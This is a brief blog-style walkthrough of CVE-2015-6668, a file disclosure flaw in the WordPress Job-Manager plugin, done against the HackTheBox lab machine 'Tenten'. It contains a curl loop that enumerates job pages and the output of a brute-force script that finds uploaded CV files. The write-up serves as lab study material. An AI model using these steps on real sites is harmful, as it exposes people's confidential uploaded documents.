---
layout: post
title: Wordpress Job-Manager Plugin File Disclosure
description: Wordpress Job-Manager Plugin File Disclosure
summary: Wordpress Job-Manager Plugin File Disclosure
tags: [foothold,wordpress,web]
minute: 1
---
## Overview
Vulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.

CVE-2015-6668

## Environment Setup
* Wordpress running job manager plugin 0.7.25.

## Steps
* Check what available are the available job titles

```bash
for i in $(seq 1 25); do echo -n "$i: "; curl -s http://tenten/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'>' -f2 | cut -d'<' -f1; done
```

* Using this [script](https://github.com/1nf1n17yk1ng/CVE-2015-6668), brute force the possible files you can retrieve from the uploads directory

```bash
➜  exploit python2 brute.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25

Enter a vulnerable website: http://tenten
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg
➜  exploit 
```

## References
* HTB Tenten